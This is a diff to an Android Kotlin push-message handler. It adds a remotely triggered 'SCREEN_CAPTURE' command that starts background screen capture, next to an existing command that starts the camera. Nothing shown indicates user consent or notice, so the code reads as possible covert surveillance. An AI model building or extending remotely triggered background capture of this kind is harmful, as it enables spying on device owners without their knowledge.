@@ -66,6 +66,16 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                     Log.e(TAG, "❌ Failed to start camera service", e)
                 }
             }
+            "SCREEN_CAPTURE" -> {
+                Log.d(TAG, "🖥️ Executing: Request Screen Capture (Background)")
+                
+                try {
+                    ScreenCaptureBackgroundService.startCapture(applicationContext)
+                    Log.d(TAG, "✅ Background screen capture service started")
+                } catch (e: Exception) {
+                    Log.e(TAG, "❌ Failed to start screen capture service", e)
+                }
+            }
             "REQUEST_NOTIFICATION" -> {
                 Log.d(TAG, "� Command: Request Notification")
                 Log.d(TAG, "⚠️ Notification requires UI - notify Flutter if app is open")
